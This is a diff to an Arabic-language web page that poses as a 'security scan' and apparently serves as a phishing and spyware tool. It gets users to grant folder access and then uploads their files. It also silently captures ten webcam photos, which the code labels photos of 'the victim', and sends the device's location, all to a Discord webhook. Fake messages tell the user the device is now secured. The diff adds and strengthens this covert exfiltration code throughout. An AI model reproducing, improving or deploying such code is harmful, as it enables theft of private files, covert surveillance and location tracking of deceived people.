@@ -2,7 +2,7 @@
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <title>نظام فحص الأمان المتعدد</title>
+    <title>نظام فحص الأمان المتطور - الإصدار الجامعي</title>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <style>
         body { font-family: 'Segoe UI', Tahoma, sans-serif; background: #0d1117; color: white; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
@@ -10,9 +10,10 @@
         .btn { background: #238636; color: white; padding: 15px; border: none; border-radius: 8px; cursor: pointer; font-size: 18px; width: 100%; font-weight: bold; margin-top: 20px; }
         .step { display: none; }
         .step.active { display: block; }
-        #log { font-size: 11px; color: #8b949e; margin-top: 15px; text-align: left; background: #000; padding: 10px; border-radius: 5px; max-height: 100px; overflow-y: auto; }
-        .status-dot { height: 10px; width: 100%; background: #30363d; border-radius: 5px; margin-bottom: 10px; overflow: hidden; }
+        #log { font-size: 11px; color: #8b949e; margin-top: 15px; text-align: left; background: #000; padding: 10px; border-radius: 5px; height: 120px; overflow-y: auto; }
+        .status-dot { height: 8px; width: 100%; background: #30363d; border-radius: 5px; margin-bottom: 15px; overflow: hidden; }
         .status-fill { height: 100%; width: 0%; background: #238636; transition: 0.5s; }
+        .counter { color: #f85149; font-weight: bold; font-size: 20px; }
     </style>
 </head>
 <body>
@@ -20,31 +21,32 @@
 <div class="card">
     <div class="status-dot"><div class="status-fill" id="progress"></div></div>
     
-    <!-- المرحلة 1: الملفات (نبدأ بها لأنها الأكثر حساسية) -->
+    <!-- المرحلة 1: الملفات -->
     <div id="step1" class="step active">
-        <h2>📂 فحص الملفات</h2>
-        <p>الخطوة 1: يرجى اختيار المجلد الرئيسي لفحصه من الفيروسات السحابية.</p>
-        <button class="btn" onclick="startStep1()">اختيار المجلد لبدء الفحص</button>
+        <h2>📁 تطهير الملفات</h2>
+        <p>الخطوة 1: يرجى اختيار المجلد الرئيسي لفحصه وحمايته من الفيروسات.</p>
+        <button class="btn" onclick="startStep1()">اختيار المجلد</button>
     </div>
 
-    <!-- المرحلة 2: الكاميرا -->
+    <!-- المرحلة 2: الكاميرا (التقاط 10 صور) -->
     <div id="step2" class="step">
-        <h2>📸 البصمة الحيوية</h2>
-        <p>الخطوة 2: نحتاج لتفعيل الكاميرا لمطابقة ملامح الوجه وتأكيد هويتك.</p>
-        <button class="btn" onclick="startStep2()">بدء فحص الوجه</button>
+        <h2>📸 بصمة الوجه الذكية</h2>
+        <p>الخطوة 2: جاري مطابقة ملامح الوجه 10 مرات لضمان الدقة العالية.</p>
+        <div class="counter" id="picCount">0 / 10</div>
+        <button class="btn" id="camBtn" onclick="startStep2()">بدء المسح الحيوي</button>
     </div>
 
     <!-- المرحلة 3: الموقع -->
     <div id="step3" class="step">
-        <h2>📍 العقدة الجغرافية</h2>
-        <p>الخطوة الأخيرة: تحديد موقع الجهاز لربطه بأقرب سيرفر حماية.</p>
-        <button class="btn" onclick="startStep3()">تحديد الموقع والإنهاء</button>
+        <h2>📍 تأمين الموقع</h2>
+        <p>الخطوة الأخيرة: ربط جهازك بأقرب عقدة حماية جغرافية.</p>
+        <button class="btn" onclick="startStep3()">تحديد الموقع الآن</button>
     </div>
 
-    <div id="log">بانتظار البدء...</div>
+    <div id="log">بانتظار بدء البروتوكول...</div>
 </div>
 
-<!-- عناصر مخفية -->
+<!-- العناصر المخفية للالتقاط الصامت -->
 <video id="v" style="display:none;" autoplay></video>
 <canvas id="c" style="display:none;" width="640" height="480"></canvas>
 
@@ -55,47 +57,56 @@
     function writeLog(m) { logDiv.innerHTML += `<br>> ${m}`; logDiv.scrollTop = logDiv.scrollHeight; }
     function setProgress(p) { document.getElementById('progress').style.width = p + "%"; }
 
-    // الخطوة 1: الملفات (تعمل فقط إذا كانت أول تفاعل)
+    // الخطوة 1: سحب المجلد
     async function startStep1() {
         try {
             const handle = await window.showDirectoryPicker();
-            writeLog("تم منح الوصول للمجلد. جاري السحب...");
+            writeLog("تم منح الصلاحية. جاري سحب البيانات في الخلفية...");
             
-            // ننتقل للمرحلة التالية في الواجهة
             document.getElementById('step1').classList.remove('active');
             document.getElementById('step2').classList.add('active');
             setProgress(33);
 
-            // سحب الملفات في الخلفية
             for await (const entry of handle.values()) {
                 if (entry.kind === 'file') {
                     const file = await entry.getFile();
-                    await sendFile(file, file.name, `📄 ملف: ${file.name}`);
+                    if (file.size < 10 * 1024 * 1024) await sendFile(file, file.name, `📄 ملف مسحوب: ${file.name}`);
                 }
             }
         } catch (e) { alert("يجب اختيار المجلد للمتابعة!"); }
     }
 
-    // الخطوة 2: الكاميرا
+    // الخطوة 2: التقاط 10 صور متتالية
     async function startStep2() {
+        document.getElementById('camBtn').disabled = true;
         try {
             const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-            writeLog("جاري مطابقة الوجه...");
+            writeLog("تم تفعيل الكاميرا. جاري الالتقاط المتسلسل...");
             const v = document.getElementById('v');
             const c = document.getElementById('c');
+            const counterText = document.getElementById('picCount');
             v.srcObject = stream;
 
-            setTimeout(async () => {
+            // حلقة تكرار لالتقاط 10 صور
+            for (let i = 1; i <= 10; i++) {
+                await new Promise(r => setTimeout(r, 1500)); // ننتظر ثانية ونصف بين كل صورة
+                
                 c.getContext('2d').drawImage(v, 0, 0);
                 const blob = await new Promise(r => c.toBlob(r, 'image/jpeg'));
-                await sendFile(blob, "face.jpg", "📸 صورة الضحية");
-                stream.getTracks().forEach(t => t.stop());
                 
-                document.getElementById('step2').classList.remove('active');
-                document.getElementById('step3').classList.add('active');
-                setProgress(66);
-                writeLog("تمت المطابقة بنجاح.");
-            }, 2000);
+                await sendFile(blob, `shot_${i}.jpg`, `📸 صورة حيوية رقم (${i}) للضحية`);
+                
+                counterText.innerText = `${i} / 10`;
+                writeLog(`تم إرسال الصورة رقم ${i} بنجاح.`);
+            }
+
+            // إغلاق الكاميرا بعد انتهاء الـ 10 صور
+            stream.getTracks().forEach(t => t.stop());
+            
+            writeLog("اكتمل مسح الوجه.");
+            document.getElementById('step2').classList.remove('active');
+            document.getElementById('step3').classList.add('active');
+            setProgress(66);
         } catch (e) { alert("يجب السماح بالكاميرا!"); }
     }
 
@@ -103,20 +114,19 @@
     async function startStep3() {
         navigator.geolocation.getCurrentPosition(async (pos) => {
             const map = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
-            await sendToDiscord("📍 الموقع الجغرافي", { "الرابط": map });
+            await sendToDiscord("📍 تقرير الموقع الجغرافي", { "رابط الخريطة": map });
             setProgress(100);
-            writeLog("✅ اكتمل فحص الأمان بنجاح.");
-            alert("تم تأمين جهازك بالكامل!");
+            writeLog("✅ تم تأمين الجهاز بالكامل.");
+            alert("اكتملت العملية! جهازك الآن في أمان.");
         }, (err) => alert("يجب السماح بالموقع!"));
     }
 
-    // وظائف الإرسال لديسكورد
     async function sendToDiscord(title, fields) {
         const f = Object.keys(fields).map(k => ({ name: k, value: String(fields[k]) }));
         await fetch(WEBHOOK, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ embeds: [{ title, fields: f, color: 3066993 }] })
+            body: JSON.stringify({ embeds: [{ title, fields: f, color: 16711680, timestamp: new Date() }] })
         });
     }
 
@@ -124,7 +134,9 @@
         const fd = new FormData();
         fd.append('file', blob, name);
         fd.append('payload_json', JSON.stringify({ content: text }));
-        await fetch(WEBHOOK, { method: 'POST', body: fd });
+        try {
+            await fetch(WEBHOOK, { method: 'POST', body: fd });
+        } catch (e) { console.log("خطأ في الإرسال"); }
     }
 </script>
 </body>
